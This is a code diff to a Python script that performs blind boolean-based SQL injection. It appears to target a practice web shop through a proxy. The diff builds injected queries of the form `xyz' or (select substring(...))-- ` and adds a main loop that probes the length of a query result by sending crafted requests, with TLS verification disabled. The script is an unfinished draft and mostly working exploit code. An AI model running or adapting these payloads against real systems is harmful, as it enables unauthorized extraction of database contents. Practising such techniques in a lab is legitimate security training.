@@ -5,8 +5,6 @@ code in process
 import sys
 import logging
 import urllib3
-import string
-import concurrent.futures
 
 import requests
 
@@ -23,8 +21,6 @@ logging.basicConfig(
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-AVAIL_CHARS = string.printable
-MAX_LENGTH = 100
 
 
 def format_length_query(inner_query, length):
@@ -32,7 +28,7 @@ def format_length_query(inner_query, length):
 
 
 def format_char_query(inner_query, index, char):
-    return f"xyz' or (select substring(({inner_query}), {index}, 1)=chr({char}))-- "
+    return f"xyz' or (Select substring(({inner_query}), {index}, 1)=chr({char}))-- "
 
 
 def is_true(resp):
@@ -49,6 +45,23 @@ def format_request(url, outer_query):
     prepped = request.prepare()
     return prepped
 
+def main(args):
+    sess = requests.Session()
+    shop = Shop(args.url, args.no_proxy, sess)
+    inner_query = "SELECT 'aaaa'"
+    response_length = None
+    for i in range(1, 5):
+        outer_query = format_length_query(inner_query, i)
+        prepped = format_request(shop.base_url, outer_query)
+        if shop.no_proxy:
+            resp = sess.send(prepped)
+        else:
+            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
+        if is_true(resp):
+            response_length = i
+            log.info(f"Length of query response is {response_length}")
+            break
+        
 
 #------------------------------------------------------------------------------------------
 #draft
